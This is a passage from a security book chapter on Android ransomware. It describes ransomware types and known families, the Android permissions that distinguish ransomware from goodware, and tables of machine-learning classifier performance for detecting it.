<html><head></head><body>
<div id="book-content">
<div id="sbo-rt-content"><h2 class="h2" id="ch10"><span epub:type="pagebreak" id="page_251"/><strong><span class="big">10</span><br/>RANSOMWARE</strong></h2>&#13;
<div class="image1"><img src="../images/common.jpg" alt="Image" width="189" height="189"/></div>&#13;
<p class="noindentsa">Ransomware attacks have targeted hospitals, financial firms, academic institutions, and other organizations, garnering substantial media coverage. The WannaCry attack in 2017, for instance, has all the hallmarks of a spy thriller. Reports state that, among other capabilities, it abused unpatched vulnerabilities through exploit code called EternalBlue originally developed by the NSA and caused up to $8 billion in damages.</p>&#13;
<p class="indent">If there is any good news in this book, it’s that ransomware attacks like this one haven’t significantly impacted Android. Ransomware targeting the Android operating system has always been relatively uncommon and is now nearly extinct. We believe this is because Android ransomware apps cannot reliably spread from device to device. In addition, Android’s application isolation architecture makes it hard to encrypt files owned by other apps without an effective privilege escalation exploit. Another hurdle is that devices usually back up user files to the cloud automatically, so instead of paying a ransom, users can simply uninstall the ransomware or factory-reset their devices, then restore their cloud backups.</p>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_252"/>Mobile ransomware is also less profitable than other forms. Most Android users are individuals, not corporations, so their devices contain less sensitive data, and they have a lower ability to pay, making them less attractive targets. In contrast, large corporations may end up paying millions of dollars after a ransomware attack to recover their data, the control of their systems, and the ability to continue their operations. For example, Bloomberg reports that the Chicago-based insurance giant CNA paid a ransom of $40 million in 2021.</p>&#13;
<p class="indent">We’ll begin this chapter with a brief description of Android ransomware and a discussion of specific ransomware families. Then, we’ll analyze the performance of machine learning classifiers at detecting ransomware.</p>&#13;
<h3 class="h3" id="ch10lev1"><strong>How Ransomware Attacks Work</strong></h3>&#13;
<p class="noindent">On Android, there are two broad classes of ransomware: lockers and crypters. <em>Lockers</em> tend to lock a device at the operating system level. When the user tries to turn it on, a screen pops up demanding a ransom. To regain access, the user must follow instructions to pay the ransom, usually in cryptocurrency. Lockers typically don’t encrypt files, and because the integrity of the data hasn’t been compromised, it’s usually possible to recover the device by booting into <em>safe mode</em>, a little-known feature of all Android phones that loads a bare-bones operating system without running the user’s apps.</p>&#13;
<p class="indent"><em>Crypto</em> ransomware encrypts some or all of the files on a device, at least to the extent permitted by Android’s app and storage isolation protections. The victim loses access to the files and can’t recover them until they pay the ransom. Although they should then receive a decryption key, not all victims who pay the ransom receive a functioning key. A third ransomware category, <em>cryptolockers</em>, combines encryption and locking ransomware.</p>&#13;
<p class="indent">Automatic backups can enable victims to avoid the worst effects of ransomware. In response, modern ransomware often uses an <em>encrypt, exfiltrate, and leak (EEL)</em> strategy. EEL ransomware encrypts the user’s files, exfiltrates them to a command-and-control center, and threatens to leak private data if the ransom isn’t paid. Sometimes, the attacker releases some of the data and then escalates their ransom demands, threatening to release more data if the increased amount isn’t paid.</p>&#13;
<p class="indent">As you’ll see in the next section, ransomware apps tend not to be found on Google Play, suggesting that most make their way onto user devices through app sideloading. This is because unofficial app stores may not have the sophisticated security mechanisms built into Google Play. Android users may also fall victim to malicious websites.</p>&#13;
<h3 class="h3" id="ch10lev2"><strong>Android Ransomware Families</strong></h3>&#13;
<p class="noindent">Chiffon, a well-known Android ransomware family, was discovered in 2015 by the security company Zscaler. It makes its way onto devices when users download what seems to be a pornographic app. Once installed, Chiffon attempts to use the device’s camera to capture a photo of the victim. The <span epub:type="pagebreak" id="page_253"/>photo is then presented to them as part of the ransom note, causing the victim to worry that the photo will be sent to everyone in their contact list or that their contacts will receive a message that includes a link to the pornography app.</p>&#13;
<p class="indent">The Jisut ransomware family was first discovered in 2014 and subsequently generated thousands of variants. Once launched, the app would request administrative permissions and use these to lock the device or encrypt the user’s files. It would then announce to the user that their device was infected and make a ransom demand. Certain versions of this malware family also had characteristics of spyware, as they stole passwords to the Chinese social network QQ. For a technical paper about this ransomware family, see “An in-Depth Study of the Jisut Family of Android Ransomware” by Alejandro Martín et al.</p>&#13;
<p class="indent">LeakerLocker is a ransomware family that spread via bogus wallpaper and device cleaner apps. Instead of locking the device, LeakerLocker captured user data, such as personal photos, contacts, SMS messages, phone call history, Facebook messages, visits to websites, full email messages, and GPS information. The ransom note threatened to dump this data on the internet, then prompted the user to pay using a credit card. McAfee first described this malware in 2017 in a blog post titled “LeakerLocker: Mobile Ransomware Acts Without Encryption.”</p>&#13;
<p class="indent">Simplocker is often considered the first crypto ransomware for Android. Discovered in 2014 and described by Czech anti-malware company ESET on its malware database website, this ransomware family was initially portrayed as an antivirus tool. Once downloaded, the app would encrypt files on the device’s SD card and demand payment. While different versions of this ransomware family have different features, some versions involve the use of the Tor network to facilitate communications between the app and the attacker’s command-and-control server.</p>&#13;
<p class="indent">Svpeng, which started out as a banking trojan, was discovered by Kaspersky in 2013. In 2017, Svpeng added ransomware functionality. Potential victims received an email that appeared to come from the FBI. The email claimed that the user had engaged in viewing or distributing pornographic content and threatened them with hefty fines and a jail term unless they complied with the instructions in the email, which involved electronically sending a prepaid MoneyPak card to the perpetrators.</p>&#13;
<p class="indent">Police is a family of Android ransomware similar in many ways to both Chiffon and Svpeng. Like Chiffon, it reaches devices via a pornography app, and like Svpeng, it masquerades as the police, accusing the user of distributing pornography and threatening all kinds of legal consequences unless the victim pays up. Similarly, SimpleLocker is a well-known ransomware family that infects devices when users attempt to visit a bogus pornography website. Once compromised, the app encrypts the contents of the victim’s SD card, such as their documents, images, and videos, and presents a ransom demand to the user.</p>&#13;
<div class="image"><img id="ch10fig1" src="../images/ch10fig01.jpg" alt="Image" width="1860" height="932"/></div>&#13;
<p class="figcap"><em>Figure 10-1: Top 20 features that best distinguish Android ransomware from goodware</em></p>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_254"/><span epub:type="pagebreak" id="page_255"/>Discovered around 2017, Anubis is hybrid malware that operates as both a banking trojan and spyware by stealing login credentials for financial sites such as PayPal. The ransomware module was added in 2019, to lock screens and encrypt files.</p>&#13;
<h3 class="h3" id="ch10lev3"><strong>Ransomware vs. Goodware</strong></h3>&#13;
<p class="noindent"><a href="ch10.xhtml#ch10fig1">Figure 10-1</a> shows the 20 features that play the biggest role in separating ransomware from goodware using the Extra-Trees classifier discussed in <a href="ch07.xhtml">Chapter 7</a>.</p>&#13;
<p class="indent">As you can see, 11 of the top 20 features are related to permissions. Note that, unlike with ABTs, SMS-related permissions aren’t very important for distinguishing ransomware from goodware. Let’s explore the ones that are more helpful.</p>&#13;
<h4 class="h4" id="ch10lev1sec1"><strong><em>Permission-Related Features</em></strong></h4>&#13;
<p class="noindent">The <span class="literal">MOUNT_UNMOUNT_FILESYSTEMS</span> permission is one of the most important for classifying ransomware, as it is requested by over 40 percent of ransomware apps but only around 5 percent of goodware. This comes as a surprise, as the permission requires the use of a privilege escalation exploit that allows apps to manipulate the filesystem. We aren’t aware of any Android ransom-ware containing such an exploit, so the malware wouldn’t be able to use this permission in practice. The small number of ransomware families likely skews the statistical distribution of this feature. Several ransomware families request dozens of permissions, including <span class="literal">MOUNT_UNMOUNT_FILESYSTEMS</span>, but don’t actually use them.</p>&#13;
<p class="indent">We’ve described the <span class="literal">GET_TASKS</span> permission in previous chapters. In a nutshell, it allows the app to see what processes are running on the device. This permission can be used defensively too, for example to check for the presence of security software on the device or to force the user to interact with the user interface in a certain way. The Svpeng ransomware family uses this permission to ensure that the user grants the ransomware device administrative permissions on the administration screen, while the Simplocker family continuously monitors the app that is in the foreground and tries to kill it as soon as possible if the user starts to interact with any app besides the ransomware itself. This permission is sought about four times more frequently by ransomware than by goodware.</p>&#13;
<p class="indent">The <span class="literal">INSTALL_PACKAGES</span> permission enables a privileged app to silently install other apps. As this permission is privileged, normal apps can’t use it, and goodware almost never requests it. Over 20 percent of ransomware apps do, however, for reasons that are unclear. As in the case of <span class="literal">MOUNT_UNMOUNT_FILESYSTEMS</span>, ransomware cannot actually use this permission, and spot-checking ransomware samples from our library showed that most samples that request <span class="literal">INSTALL_PACKAGES</span> also request the unprivileged and user-consented permission <span class="literal">REQUEST_INSTALL_PACKAGES</span>. It’s possible that ransomware <span epub:type="pagebreak" id="page_256"/>developers request both permissions in case the app somehow ends up with elevated privileges.</p>&#13;
<p class="indent">The <span class="literal">READ_PHONE_STATE</span> permission is requested more than twice as frequently by ransomware than by goodware. It enables the ransomware to extract information about the user’s phone number, current calls, cell phone provider, and more. In principle, it could enable the ransomware developer to call the victim and speak to them over the phone.</p>&#13;
<p class="indent">The <span class="literal">ACCESS_WIFI_STATE</span> permission provides access to the Android <span class="literal">WifiManager</span> to get the state of the device’s Wi-Fi connection. We’ve seen this permission used by ransomware apps such as Simplocker to force a Wi-Fi connection and ensure that the ransomware can communicate with its command-and-control server. Over 80 percent of ransomware samples request this permission, which is more than double the percentage of goodware apps that do.</p>&#13;
<p class="indent">Not surprisingly, ransomware apps use the <span class="literal">SYSTEM_ALERT_WINDOW</span> permission to place a window over the entire screen, presumably to display the ransom demand. Importantly, the overlay window prevents the user from operating the device. The probability of ransomware requesting this permission is about four times the probability of goodware requesting it.</p>&#13;
<p class="indent">The <span class="literal">READ_LOGS</span> permission is also requested about four times as frequently by ransomware as by goodware. We haven’t observed it used for functionality related to locking phones or asking for ransom, however, and suspect that it is an artifact of the technological choices made by ransomware developers. For example, several ransomware families use commercial app protection tools like Tencent Legu or Qihoo 360 Jiagu to protect themselves from reverse engineering. These protection tools use the <span class="literal">READ_LOGS</span> permission to collect log information for crash diagnostics. Due to the small number of ransomware families, technological choices made by even a few will have an outsized impact on machine learning features.</p>&#13;
<p class="indent">Goodware almost never uses the <span class="literal">KILL_BACKGROUND_PROCESSES</span> permission, but over 25 percent of ransomware does. This permission enables the ransomware to kill any antivirus processes that may be running on the device. As mentioned before, some ransomware families, like Simplocker, also try to blanket-kill all processes besides the ransomware’s, and some allow an explicit list of system setting dialogs that the ransomware wants the user to interact with.</p>&#13;
<p class="indent">Ransomware requests the <span class="literal">RECEIVE_BOOT_COMPLETED</span> permission almost three times more frequently than goodware. This permission is important because it lets ransomware start up when the user reboots the device. Once boot is complete, the malicious app can immediately block access to the device and show the ransom demand screen.</p>&#13;
<p class="indent">The <span class="literal">RESTART_PACKAGES</span> permission is another one that is rarely used by goodware but is requested by over 25 percent of ransomware. We haven’t found it used in any actual ransomware behavior, but it is sometimes used by SDKs embedded in ransomware apps. Even that is surprising, as this permission was deprecated in 2011, in Android 4.0.3 (Ice Cream Sandwich).</p>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_257"/><a href="ch10.xhtml#ch10tab1">Table 10-1</a> shows some of the common permissions requested by six important malware families. We see that some families, like Simplocker, request virtually every permission, while others are much more selective.</p>&#13;
<p class="tabcap" id="ch10tab1"><strong>Table 10-1:</strong> Permissions Requested by Ransomware Families</p>&#13;
<table class="all">&#13;
<colgroup>&#13;
<col style="width:15%"/>&#13;
<col style="width:15%"/>&#13;
<col style="width:15%"/>&#13;
<col style="width:15%"/>&#13;
<col style="width:10%"/>&#13;
<col style="width:15%"/>&#13;
<col style="width:15%"/>&#13;
</colgroup>&#13;
<thead>&#13;
<tr>&#13;
<th class="table-h" style="vertical-align: top"><p class="noindent-tab"><strong>Permission</strong></p></th>&#13;
<th class="table-h" style="vertical-align: top"><p class="noindent-tab"><strong>Chiffon</strong></p></th>&#13;
<th class="table-h" style="vertical-align: top"><p class="noindent-tab"><strong>LeakerLocker</strong></p></th>&#13;
<th class="table-h" style="vertical-align: top"><p class="noindent-tab"><strong>Simplocker</strong></p></th>&#13;
<th class="table-h" style="vertical-align: top"><p class="noindent-tab"><strong>Police</strong></p></th>&#13;
<th class="table-h" style="vertical-align: top"><p class="noindent-tab"><strong>Jisut</strong></p></th>&#13;
<th class="table-h" style="vertical-align: top"><p class="noindent-tab"><strong>SimpleLocker</strong></p></th>&#13;
</tr>&#13;
</thead>&#13;
<tbody>&#13;
<tr>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent"><span class="literal">MOUNT_UNMOUNT_FILESYSTEMS</span></p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">No</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">No</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">Yes</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">No</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">Yes</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">No</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="noindent-tab"><span class="literal">GET_TASKS</span></p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">Yes</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">No</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">Yes</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">No</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">No</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">No</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent"><span class="literal">INSTALL_PACKAGES</span></p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">No</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">No</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">Yes</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">No</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">Yes</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">No</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="noindent-tab"><span class="literal">READ_PHONE_STATE</span></p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">Yes</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">Yes</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">Yes</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">No</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">No</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">Yes</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent"><span class="literal">GET_PACKAGE_SIZE</span></p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">No</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">No</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">Yes</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">No</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">No</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">No</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="noindent-tab"><span class="literal">ACCESS_WIFI_STATE</span></p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">No</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">Yes</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">Yes</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">No</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">No</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">No</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent"><span class="literal">SYSTEM_ALERT_WINDOW</span></p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">Yes</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">Yes</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">Yes</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">Yes</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">Yes</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">No</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="noindent-tab"><span class="literal">READ_LOGS</span></p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">No</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">No</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">Yes</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">No</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">No</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">No</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent"><span class="literal">KILL_BACKGROUND_PROCESSES</span></p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">No</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">No</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">Yes</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">No</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">No</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">No</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="noindent-tab"><span class="literal">RECEIVE_BOOT_COMPLETED</span></p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">Yes</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">Yes</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">Yes</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">Yes</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">Yes</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">Yes</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent"><span class="literal">RESTART_PACKAGES</span></p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">No</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">No</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">Yes</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">No</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">No</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">No</p></td>&#13;
</tr>&#13;
</tbody>&#13;
</table>&#13;
<p class="indent">Some permissions, such as <span class="literal">RECEIVE_BOOT_COMPLETED</span> are requested by all six of the families we’ve studied, while others, like <span class="literal">READ_LOGS</span> and <span class="literal">KILL_BACKGROUND_PROCESSES</span>, are requested by just one app. These simple analyses show the diversity of ransomware’s behaviors.</p>&#13;
<h4 class="h4" id="ch10lev1sec2"><strong><em>Other Features</em></strong></h4>&#13;
<p class="noindent">Ransomware tends to make more calls to <span class="literal">org.apache.conn</span> and <span class="literal">org.apache.conn.scheme</span> than goodware, perhaps so it can maintain connections between the compromised device and the malware developers’ command-and-control server. Since ransomware apps on Android are rare and the number of identified families small, the use of Apache libraries by even a few of them makes the prediction power of features involving those calls relatively high, explaining these observations.</p>&#13;
<p class="indent">Our analysis also indicates that ransomware apps seem to make fewer calls to various Android API packages than goodware does. Ransomware apps tend to be small APKs that focus on their core business, and unlike legitimate apps, they need to use only a few Android API packages to achieve their goal.</p>&#13;
<h4 class="h4" id="ch10lev1sec3"><strong><em>Prediction Efficacy</em></strong></h4>&#13;
<p class="noindent"><a href="ch10.xhtml#ch10tab2">Table 10-2</a> shows the performance of selected machine learning classifiers at separating ransomware from goodware, given different sets of features. The first column lists the types of features used in the prediction, including basic API, static, and dynamic features as well as advanced features derived from TSGs, landmarks, feature clustering, and correlation graphs. We also <span epub:type="pagebreak" id="page_258"/>show combinations of these types. The second column shows the best classification approach using the set of features in a given row, and subsequent columns show various predictive performance metrics.</p>&#13;
<p class="tabcap" id="ch10tab2"><strong>Table 10-2:</strong> Metrics for Evaluating Android Ransomware vs. Goodware</p>&#13;
<table class="all">&#13;
<colgroup>&#13;
<col style="width:20%"/>&#13;
<col style="width:20%"/>&#13;
<col style="width:10%"/>&#13;
<col style="width:10%"/>&#13;
<col style="width:10%"/>&#13;
<col style="width:10%"/>&#13;
<col style="width:10%"/>&#13;
<col style="width:10%"/>&#13;
</colgroup>&#13;
<thead>&#13;
<tr>&#13;
<th class="table-h" style="vertical-align: top"><p class="noindent-tab"><strong>Feature set</strong></p></th>&#13;
<th class="table-h" style="vertical-align: top"><p class="noindent-tab"><strong>Best classifier</strong></p></th>&#13;
<th class="table-h" style="vertical-align: top"><p class="noindent-tab"><strong>AUC</strong></p></th>&#13;
<th class="table-h" style="vertical-align: top"><p class="noindent-tab"><strong>Precision</strong></p></th>&#13;
<th class="table-h" style="vertical-align: top"><p class="noindent-tab"><strong>Recall</strong></p></th>&#13;
<th class="table-h" style="vertical-align: top"><p class="noindent-tab"><strong>F1</strong></p></th>&#13;
<th class="table-h" style="vertical-align: top"><p class="noindent-tab"><strong>FPR</strong></p></th>&#13;
<th class="table-h" style="vertical-align: top"><p class="noindent-tab"><strong>FNR</strong></p></th>&#13;
</tr>&#13;
</thead>&#13;
<tbody>&#13;
<tr>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">API package</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">XGBoost</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.8979</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.8670</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.7926</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.8282</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.1330</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.1918</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="noindent-tab">Static (S)</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">XGBoost</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.8982</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.8570</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.7836</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.8187</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.1430</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.2009</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">Dynamic (D)</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">MLP</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.8082</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.7806</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.6359</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.7009</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.2194</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.3094</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="noindent-tab">S + D</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">RF</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.9100</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.8498</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.8106</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.8297</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.1502</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.1822</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top" class="gray tab"><p class="noindent">API + S + D</p></td>&#13;
<td style="vertical-align: top" class="gray tab"><p class="noindent">GBDT</p></td>&#13;
<td style="vertical-align: top" class="gray tab"><p class="noindent">0.9168</p></td>&#13;
<td style="vertical-align: top" class="gray tab"><p class="noindent">0.8635</p></td>&#13;
<td style="vertical-align: top" class="gray tab"><p class="noindent">0.8285</p></td>&#13;
<td style="vertical-align: top" class="gray tab"><p class="noindent">0.8456</p></td>&#13;
<td style="vertical-align: top" class="gray tab"><p class="noindent">0.1365</p></td>&#13;
<td style="vertical-align: top" class="gray tab"><p class="noindent">0.1659</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="noindent-tab">TSG</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">XGBoost</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.8231</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.7353</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.7540</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.7445</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.2647</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.2541</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">LM</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">RF</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.7947</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.7409</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.6350</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.6839</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.2591</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.3217</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="noindent-tab">FC</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">SVM</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.6571</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.9262</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.3189</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.4745</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.0738</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.4135</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">CG</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">RF</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.6229</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.6022</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.4194</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.4944</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.3978</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.4477</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="noindent-tab">API + S + D + TSG</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">GBDT</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.9457</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.8845</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.8803</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.8824</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.1155</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.1199</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">API + S + D + LM</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">GBDT</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.9431</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.8789</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.8822</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.8805</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.1211</p></td>&#13;
<td style="vertical-align: top" class="gray"><p class="noindent">0.1190</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="noindent-tab">API + S + D + FC</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">RF</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.9439</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.8789</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.8756</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.8772</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.1211</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.1248</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top" class="gray tab"><p class="noindent">API + S + D + CG</p></td>&#13;
<td style="vertical-align: top" class="gray tab"><p class="noindent">XGBoost</p></td>&#13;
<td style="vertical-align: top" class="gray tab"><p class="noindent">0.9447</p></td>&#13;
<td style="vertical-align: top" class="gray tab"><p class="noindent">0.8794</p></td>&#13;
<td style="vertical-align: top" class="gray tab"><p class="noindent">0.8794</p></td>&#13;
<td style="vertical-align: top" class="gray tab"><p class="noindent">0.8794</p></td>&#13;
<td style="vertical-align: top" class="gray tab"><p class="noindent">0.1206</p></td>&#13;
<td style="vertical-align: top" class="gray tab"><p class="noindent">0.1214</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="noindent-tab">All features</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">XGBoost</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.9243</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.8470</p></td>&#13;
<td style="vertical-align: top"><p class="noindent-tab">0.9329</p></td>&#13;
